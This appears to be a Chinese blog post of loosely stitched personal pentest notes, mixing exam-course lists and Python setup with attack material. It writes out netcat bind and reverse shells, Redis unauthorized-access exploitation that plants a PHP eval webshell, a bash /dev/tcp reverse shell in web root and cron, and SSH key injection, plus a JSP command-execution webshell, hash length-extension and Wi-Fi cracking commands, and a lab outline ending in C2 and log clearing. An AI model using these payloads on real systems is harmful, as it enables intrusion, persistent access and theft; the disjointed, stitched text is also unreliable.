<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XXnic13LwUPyjKc9icI9Ep2AtHFvYeMAVrw8ETx99EBK3bL1xArtTR0uTck8ibgBibGiapia6Wib0esD9jMw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>**<br>**</p>
<p><strong>67所211计算机相关专业目录【3/4】</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XUMpcx47Reo4tPZ6MtLCUoBbIB5YE5eibM7amekZQ0aGUXOvDlCHqLwsufv0xIjlnQmZvjonGdX21g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>67所211计算机相关专业目录【4/4】</strong> </p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XXnic13LwUPyjKc9icI9Ep2AtmdQypLsAxgmBYC0mz8peI3kkhVsdnMwjKEQ67n8jfRWpIANcyAEwBQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>选英一数一单科</p>
<p>还是英二数二408的问题</p>
<blockquote>
<p>Cmder.exe /REGISTER ALL</p>
<p>172.17.100.3</p>
<p>172.17.1.1</p>
<p>172.17.1.121</p>
<p>192.168.50.2</p>
</blockquote>
<p>大二   <strong>离散数学，算法设计与分析，编译原理</strong>    <strong>专业基础</strong> : <strong>密码学，信息安全治理</strong> </p>
<p> 大三阶段就是专业课程了：<strong>漏电分析，逆向工程，大数据安全，网络通信原理、网络对抗，操作系统与内核，灾备，数字水印，数字签名</strong>等等。 </p>
<p><strong>数学与自然科学</strong>：高等数学、线性代数、大学物理、离散数学、概率论与随机过程、概率论与数理统计、组合数学等等。</p>
<p><strong>计算机基础</strong>：计算导论与程序设计、数据结构、数字逻辑与数字系统、计算机网络等等，</p>
<p><strong>学科基础**</strong>：现代密码学、汇编语言与逆向工程、算法设计与分析、编译原理与技术等等**</p>
<p><strong>专业基础</strong>：编码理论、信息安全概论、网络安全、信息系统安全、操作系统内核、web开发等等</p>
<h2 id="创建一个独立的Python环境"><a href="#创建一个独立的Python环境" class="headerlink" title="创建一个独立的Python环境"></a>创建一个独立的Python环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure>

<p>安装virtualenv后，创建一个独立的Pyhton环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv my_env</span><br></pre></td></tr></table></figure>

<p>如果你的系统自带Python2.x,在你安装Python3.X版本之后，你必须告诉virtualenv应该使用后者。你可以找到Python3的安装路径，使用以下命令创建虚拟环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zenx$ *which python3* &#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.5&#x2F;bin&#x2F;python3 zenx$ *virtualenv my_env -p &#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.5&#x2F;bin&#x2F;python3*</span><br></pre></td></tr></table></figure>

<p>运行下面的命令来启动虚拟环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source my_env&#x2F;bin&#x2F;activate</span><br></pre></td></tr></table></figure>

<p>出现以下情形就说明你已经开启虚拟环境，并且正在使用它：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my_env)laptop:~ zenx$</span><br></pre></td></tr></table></figure>

<p>你可以使用<strong>deactivate</strong>命令来随时关闭虚拟环境。使用virtualenvwrapper。此工具提供了包装器，使它更容易创建和管理你的虚拟环境。</p>
<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>d 后台模式<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g gateway source-routing hop point[s], up to 8<br>-G num source-routing pointer: 4, 8, 12, …<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-L 连接关闭后,仍然继续监听<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 随机本地及远程端口<br>-s addr 本地源地址<br>-t 使用TELNET交互方式<br>-u UDP模式<br>-v 详细输出–用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉–用于扫描时</p>
<h2 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h2><p>kali监听   nc -lvvp 7777 <code>-e /bin/bash</code></p>
<p>边界主机（192.168.217.145）：nc.exe -l -p 8888  -e cmd.exe</p>
<p>netstat -ano</p>
<p>外网机器：nc.exe -nvv 192.168.217.145 8888</p>
<p>mac连接   nc 192.168.0.23 7777</p>
<h2 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h2><p>mac(外网 192.168.0.24 )监听   nc -l 7777</p>
<p>边界机器：nc.exe -e cmd.exe  10.11.29.204 8889</p>
<p>外网机器（10.11.29.204）：nc.exe -l -p 8889</p>
<p>kali连接  nc -e /bin/bash 192.168.0.24 7777</p>
<p>所以正向弹shell是在靶机上监听端口，然后攻击者链接</p>
<p>反向弹shell是在攻击者电脑上监听端口，然后靶机链接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'method'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) )&#123;</span><br><span class="line">        $method=$_POST[<span class="string">'method'</span>];</span><br><span class="line">        $url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^http:\/\//i'</span>,$url))&#123;</span><br><span class="line">        $opts = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'http'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'method'</span>=&gt;$method,</span><br><span class="line">                <span class="string">'timeout'</span>=&gt;<span class="number">3</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $context = stream_context_create($opts);</span><br><span class="line">        $body = @file_get_contents($url.<span class="string">"/anything"</span>, <span class="keyword">false</span>, $context);想 访 问 /admin.php就 得 绕 过 /anything后 缀 ， 这 里 可 以 用 ?</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($http_response_header))&#123;</span><br><span class="line">            preg_match(<span class="string">"/Allow:(.*?);/i"</span>,implode(<span class="string">';'</span>,$http_response_header).<span class="string">";"</span>,$matches);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($matches[<span class="number">1</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"服务端支持的请求方法有:"</span>.$matches[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"failed&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">echo</span> sprintf(<span class="string">"body length of $method%d"</span>, $body);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'not allowed'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发 现 这 里 用 的 是 file_get_context_create()函 数 来 发 起 HTTP请 求 ， 一 些 配 置 选 项 包 括 这 里 的 请<br>求 方 式 是 作 为 一 个 数 组 经 过 stream_context_create()处 理 后 传 入 的 。 其 实 这 里 就 存 在 CRLF注<br>入 漏 洞 ， 即 我 们 可 以 完 全 自 己 构 造 一 个 完 整 的 POST包 发 出 去</p>
<h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><p><strong>大概的意思就是这是一个数据库，存储在内存中，可以与磁盘交互，并且支持远程连接</strong></p>
<p>因配置不当可以未授权访问，攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。</p>
<p>漏洞可能产生的危害:</p>
<pre><code>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据

攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件

如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</code></pre><p><strong>我要强调的是，如果靶机的redis配置文件中限制了可远程登录访问的iplist，或是靶机未开启ssh服务和web服务，则此漏洞非常鸡肋。</strong></p>
<p>redis-server /usr/local/redis/etc/redis.conf //启动redis</p>
<p>pkill redis //停止redis</p>
<p>卸载redis：</p>
<p>　　　　rm -rf /usr/local/redis //删除安装目录</p>
<p>　　　　rm -rf /usr/bin/redis-* //删除所有redis相关命令脚本</p>
<p>　　　　rm -rf /root/download/redis-4.0.4 //删除redis解压文件夹</p>
<p>redis基本命令 连接redis：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.93.128</span><br></pre></td></tr></table></figure>

<p>查看redis版本信息、一些具体信息、服务器版本信息等等：</p>
<p>192.168.93.128:6379&gt;info</p>
<p>将变量x的值设为test：</p>
<p>192.168.93.128：6379&gt;set x “test”</p>
<p>是把整个redis数据库删除，一般情况下不要用！！！</p>
<p>192.168.93.128:6379&gt;flushall</p>
<p>查看所有键：</p>
<p>192.168.93.128:6379&gt;KEYS *</p>
<p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>
<p>192.168.93.128:6379&gt;CONFIG GET dir192.168.93.128:6379&gt;CONFIG GET dbfilename</p>
<p>保存数据到备份目录</p>
<p>192.168.93.128:6379&gt;save</p>
<h2 id="四-常见入侵方法"><a href="#四-常见入侵方法" class="headerlink" title="四 常见入侵方法"></a><strong>四 常见入侵方法</strong></h2><ol>
<li>清空数据库，并使用config get dir命令得到redis备份的路径</li>
<li>更改备份目录为我们的目标目录</li>
<li>创建数据库的兼键值对，将数据库中的数据写入文件（也就是保存我们的命令，数据）</li>
<li>恢复相关目录等，而后就可以操作我们的文件了</li>
</ol>
<h4 id="0-redis写-etc-passwd"><a href="#0-redis写-etc-passwd" class="headerlink" title="0.redis写/etc/passwd"></a>0.redis写/etc/passwd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushdb</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename &quot;gaia.php&quot;</span><br><span class="line">set gaia &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>菜刀连接</p>
<p>web服务</p>
<p><strong>redis还可以写入任意文件到任意已知目录下，如果对方开通了web服务，则可以通过config set dir xxxxx ; config set dbfilename xxx.php ; set shell (or set webshell ) ; save ；的方式来写入任意马到对方web目录下一个访问者拥有读权限的目录下，这里我就不再细说了。</strong></p>
<h4 id="1-创建反弹shellcode的方法"><a href="#1-创建反弹shellcode的方法" class="headerlink" title="1.创建反弹shellcode的方法"></a>1.创建反弹shellcode的方法</h4><p>root@kali:~/Desktop/test# redis-cli -h 192.168.93.128</p>
<p>192.168.93.128:6379&gt; set x “bash -i &gt;&amp; /dev/tcp/192.168.93.170/7999 0&gt;&amp;1\n”</p>
<p>OK</p>
<p>192.168.93.128:6379&gt; config set dir /var/www/html/</p>
<p>OK</p>
<p>192.168.93.128:6379&gt; config set dbfilename ncshell</p>
<p>OK</p>
<p>192.168.93.128:6379&gt; save</p>
<p>OK</p>
<p>192.168.93.128:6379&gt; exit </p>
<p>//nc监听端口已经反弹回来shellnc -lvnp 7999</p>
<p>redis写定时任务反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.155&#x2F;2333 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br><span class="line">(有待测试，ubuntu测试不成功)</span><br></pre></td></tr></table></figure>

<h4 id="2-ssh免密连接"><a href="#2-ssh免密连接" class="headerlink" title="2.ssh免密连接"></a>2.ssh免密连接</h4><p>思路大体为创建一个本地的公私钥，密码为空<br>    将公钥文件写入到服务器ssh目录<br>    免密登录<br>创建ssh公私钥</p>
<p>ssh-keygen -t rsa  //会将结果在默认目录</p>
<p>进入.ssh目录:cd .ssh/，将生成的公钥保存到hack.txt</p>
<p>root@kali:~/.ssh# (echo -e “\n\n”;cat id_rsa.pub; echo -e “\n\n”) &gt; hack.txt</p>
<p>将hack.txt写入redis</p>
<p>root@kali:~/.ssh# cat hack.txt | redis-cli -h 192.168.152.133 -x set crackOK//当然我们也可以先连接 然后读取文件再写入//注意数据库不为空的话 需要清空flushall <strong>（set crackit是设置键值，这里可以理解为设置用户名，涉及redis原理我们不深入讨论）</strong></p>
<p>//接下来就是更改备份目录，将我们的文件写入到ssh目录下</p>
<p>//2. 创建ssh私钥连接</p>
<p>root@kali:~/Desktop/test# redis-cli -h 192.168.93.128</p>
<p>192.168.93.128:6379&gt; config get dir</p>
<p>1) “dir”</p>
<p>2) “/home/python/.ssh”</p>
<p>//更改redis备份路径为ssh公钥存放目录 这个就是看情况了</p>
<p>//一般默认为/root/.ssh，这没有登录root用户，那么默认路径是/home/用户名/.ssh，所以不需要更改)</p>
<p>//设置上传公钥的备份文件名字为authorized_keys</p>
<p>  <strong>$ xx.xx.xx.xx:6379&gt; config set dir /root/.ssh/<br>     ————设置当前用户主目录为/root/.ssh/</strong> </p>
<p>192.168.93.128:6379&gt; config set dbfilename authorized_keys</p>
<p> <strong>———— 设置数据库文件名为authorized_keys，这里我们覆盖了一个原本已经存在的文件（若原用户为密码连接，则此文件可能不存在）。这个 文件可以理解为我们能通过私钥连接上ssh的关键。其内容大家可以在靶机上完成实验后自行查看</strong></p>
<p>OK</p>
<p>192.168.93.128:6379&gt; save</p>
<p>OK</p>
<p>192.168.93.128:6379&gt; exit</p>
<p>直接免密登录</p>
<p>root@kali:~/.ssh# ssh -i id_rsa <a href="mailto:python@192.168.93.128">python@192.168.93.128</a></p>
<p><strong>以root权限连接到靶机<br>      ssh -i id-rsa <a href="mailto:root@xx.xx.xx.xx">root@xx.xx.xx.xx</a></strong>  </p>
<p>可以成功登录了</p>
<p>————————————————<br>版权声明：本文为CSDN博主「iamsongyu」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/iamsongyu/article/details/84171826" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/84171826</a></p>
<h4 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br></pre></td></tr></table></figure>

<p>syclover\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00syclover</p>
<p>syclover%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00syclover</p>
<p>hexpand的使用方法</p>
<p>在hexpand所在目录（当然你也可以把文件复制到/usr/bin/里）</p>
<p>./hexpand -t md5 -s 21232f297a57a5a743894a0e4a801fc3 -l 5 -m “pcat”</p>
<p>其中-l的5是哈希原文的长度，运行后就会得到附加数据，以及新得到的哈希值。</p>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>jsp马</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>





<h4 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h4><p> aircrack-ng cacosmia.cap</p>
<p> aircrack-ng cacosmia.cap -w rockyou.txt </p>
<p> airdecap-ng cacosmia.cap -e mamawoxiangwantiequan -p 12345678 </p>
<h4 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h4><p>gitbook</p>
<p><a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
<p><a href="https://valine.js.org/quickstart.html" target="_blank" rel="noopener">https://valine.js.org/quickstart.html</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">categories: </span><br><span class="line">- web</span><br><span class="line">tags: </span><br><span class="line">- xxe</span><br></pre></td></tr></table></figure>



<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p><img src="/2019/11/15/%E6%80%BB/image-20191116105326001.png" alt="image-20191116105326001"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20191116105337504.png" alt="image-20191116105337504"></p>
<h4 id="web源码泄漏"><a href="#web源码泄漏" class="headerlink" title="web源码泄漏"></a><strong>web源码泄漏</strong></h4><p>.hg源码泄漏：</p>
<p>漏洞成因：hg init的时候会生成.hg，<a href="http://www.xx.com/.hg/，" target="_blank" rel="noopener">http://www.xx.com/.hg/，</a></p>
<p>工具：dvcs-ripper，（rip-hg.pl -v -u <a href="http://www.xx.com/.hg/）" target="_blank" rel="noopener">http://www.xx.com/.hg/）</a></p>
<p>.git源码泄漏：</p>
<p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等，没有删除这个文件，导致泄漏，<a href="http://www.xxx.com/.git/config" target="_blank" rel="noopener">http://www.xxx.com/.git/config</a></p>
<p>工具：GitHack，dvcs-ripper，（GitHack.py <a href="http://www.xxx.com/.git，rip-hg.pl" target="_blank" rel="noopener">http://www.xxx.com/.git，rip-hg.pl</a> -v -u <a href="http://www.xx.com/.git/）" target="_blank" rel="noopener">http://www.xx.com/.git/）</a></p>
<p>.DS_Store源码泄漏：</p>
<p>漏洞成因：在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p>
<p>工具：dsstoreexp，（python ds_store_exp.py <a href="http://www.xxx.com/.DS_Store）" target="_blank" rel="noopener">http://www.xxx.com/.DS_Store）</a></p>
<p>网站备份压缩文件：</p>
<p>在网站的使用过程中，往往需要对网站中的文件进行修改，升级，此时就需要对网站整或其中某一页面进行备份，当备份文件或修改过程中的缓存文件因为各种原因被留在网站web目录下，而该目录又没有设置访问权限，就有可能导致备份文件被下载，导致信息泄漏，给服务器安全埋下隐患。.rar， .zip， .7z， .tar.gz， .bak， .swp， .txt， .html，</p>
<p>工具：可以使用一些扫描软件，进行扫描，如awvs之类的</p>
<p>像.swp文件，就是vim源文件泄漏，/.index.php.swp或/index.php~ 可以直接用vim -r inde.php来读取文件</p>
<p>SVN导致文件泄漏：</p>
<p>版本控制系统</p>
<p>工具：dvcs-ripper，Seay-Svn，（rip-svn.pl -v -u <a href="http://www.xxx.com/.svn/）" target="_blank" rel="noopener">http://www.xxx.com/.svn/）</a></p>
<h4 id="应用层泄漏"><a href="#应用层泄漏" class="headerlink" title="应用层泄漏"></a><strong>应用层泄漏</strong></h4><p>DNS域传送：</p>
<p>dns服务器的主备数据同步，使用的是域传送功能，如果使用默认配置文件进行配置，就会存在dns域传送漏洞（不手动添加allow-transfer）</p>
<p>工具：dig @1.1.1.1 xxx.com axfr （会泄漏一些信息）</p>
<p>HeartBleed：</p>
<p>利用https</p>
<p>从堆栈错误泄漏到RCE：</p>
<p>利用报错，泄漏信息，利用函数try{….}catche(e){e.printstack;}</p>
<p>未授权访问漏洞：</p>
<p>未授权访问—-应用层服务的问题，服务启动后，没配置任何凭证，导致可以直接进入</p>
<p>弱口令—配置的密码过于简单常见</p>
<p>空口令—没配置密码</p>
<p>目前主要存在未授权访问漏洞的如下：</p>
<p>NFS，Samba，LDAP，Rsync，FTP，Gitlab，Jenkins，MongoDB，Redis，ZooKeeper，</p>
<p>ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等，这些都是挖矿勒索的高发地带</p>
<p>如：</p>
<p>redis为授权访问漏洞，默认情况下会绑定在0.0.0.0:6379，这样会将redis服务暴露到公网上，如果没有开启认证的情况下，可以导致任意用户可以访问目标服务器，可以利用相关方法，在redis服务器上写入公钥，进而可以使用对应私钥直接登陆目标服务器。</p>
<p>1.本地生成公钥私钥</p>
<p>ssh-keygen -t rsa</p>
<p>2.把公钥写入xx.txt文件</p>
<p>(echo -e “\n\n”;cat id_rsa.pub;echo -e “\n\n”) &gt; xx.txt</p>
<p>3.连接redis写入文件</p>
<p>cat xx.txt | redis-cli -h 192.168.1.2 -x set crackit</p>
<p>redis-cli -h 192.168.1.2</p>
<p>192.168.1.2:6379&gt; config set dir /root/.ssh/</p>
<p>192.168.1.2:6379&gt; config get dir</p>
<p>1)”dir”</p>
<p>2)”/root/.ssh”</p>
<p>192.168.1.2:6379&gt; config set dbfilename “authorized_keys”</p>
<p>192.168.1.2”6379&gt; save</p>
<p>也可以使用msf里面成熟的exp来利用</p>
<p><img src="https://img2018.cnblogs.com/blog/1172529/201904/1172529-20190424150446802-1918497523.png" alt="img"></p>
<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p><img src="/2019/11/15/%E6%80%BB/image-20191116092512025.png" alt="image-20191116092512025"></p>
<h4 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h4><p><img src="https://img-blog.csdn.net/20170417201313016?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzc0NTgwNTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
<h4 id="以太坊智能合约"><a href="#以太坊智能合约" class="headerlink" title="以太坊智能合约"></a>以太坊智能合约</h4><p>常见漏洞大概就这几种，分别是整数溢出、随机数预测、Re-Entrancy（重入）等。 </p>
<h4 id="google-hack"><a href="#google-hack" class="headerlink" title="google hack"></a>google hack</h4><p><img src="/2019/11/15/%E6%80%BB/image-20191116090519499.png" alt="image-20191116090519499"></p>
<p>intext </p>
<p>intitle</p>
<p><strong>inurl</strong></p>
<p>cache</p>
<p>define</p>
<p>filetype</p>
<p>info</p>
<p>link</p>
<p><strong>site</strong></p>
<p>related    </p>
<p>源码显示javascript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=<span class="string">"handle_code"</span> href=<span class="string">"javascript:show_code()"</span>&gt;显示源码&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">function show_code()&#123;</span></span><br><span class="line"><span class="regexp">	var url = window.location.href;</span></span><br><span class="line"><span class="regexp">	if(url.indexOf("?") != -1)&#123;</span></span><br><span class="line"><span class="regexp">		url = url.split("?")[0];</span></span><br><span class="line"><span class="regexp">	&#125;	</span></span><br><span class="line"><span class="regexp">	</span></span><br><span class="line"><span class="regexp">	var e = document.getElementById("show_code");</span></span><br><span class="line"><span class="regexp">	if(e == null)&#123;</span></span><br><span class="line"><span class="regexp">		window.location.href=url+"?action=show_code";</span></span><br><span class="line"><span class="regexp">	&#125;else&#123;</span></span><br><span class="line"><span class="regexp">		window.location.href=url;</span></span><br><span class="line"><span class="regexp">	&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>











<p>靶场</p>
<p><del>一、环境搭建</del><br><del>1.环境搭建测试</del><br><del>2.信息收集</del></p>
<p><del>二、漏洞利用</del><br><del>3.漏洞搜索与利用</del><br>4.后台Getshell上传技巧<br>5.系统信息收集<br>6.主机密码收集</p>
<p>三、内网搜集<br>7.内网–继续信息收集<br>8.内网攻击姿势–信息泄露<br>9.内网攻击姿势-MS08-067<br>10.内网攻击姿势-SMB远程桌面口令猜测<br>11.内网攻击姿势-Oracle数据库TNS服务漏洞<br>12.内网攻击姿势-RPC DCOM服务漏洞</p>
<p>四、横向移动<br>13.内网其它主机端口-文件读取<br>14.内网其它主机端口-redis<br>15.内网其它主机端口-redis Getshell<br>16.内网其它主机端口-MySQL数据库<br>17.内网其它主机端口-MySQL提权</p>
<p>五、构建通道<br>18.内网其它主机端口-代理转发</p>
<p>六、持久控制<br>19.域渗透-域成员信息收集<br>20.域渗透-基础服务弱口令探测及深度利用之powershell<br>21.域渗透-横向移动[wmi利用]<br>22.域渗透-C2命令执行<br>23.域渗透-利用DomainFronting实现对beacon的深度隐藏<br>24.域渗透-域控实现与利用</p>
<p>七、痕迹清理<br>25、日志清理</p>
<p>2003  root-tvi862ubeh  god.org </p>
<p>2008R2 owa.god.org</p>
<p>win7 stu1.god.org</p>
<p>GOD\Domain Admins</p>
<p>liukaifeng01</p>
<p>本机信息收集</p>
<p>net view 获取当前组的计算机名，查看同一域/工作组的计算机列表</p>
<p>ipconfig /all 查询网络配置信息，判断是否有域的话可以根据DNS的后缀</p>
<p>nslookup</p>
<p>whoami 查看一下本机权限，确认是本地管理员</p>
<p>net localgroup administrators</p>
<p>主机信息 systeminfo ,重点关注系统版本以及打补丁的情况</p>
<p>ipconfig /all 貌似存在域的，名字叫god.org</p>
<p> net time /domain 发现回显权限不够，说明这不是域内的一台主机，应该是单独出来的</p>
<p>使用 arp -a 查看发现还有其他的网段</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/15/%E6%80%BB/" data-id="clmvmvop9001v1s7k2y8afbgl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-3 PHP代码审计" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time datetime="2019-11-15T08:48:06.000Z" itemprop="datePublished">2019-11-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
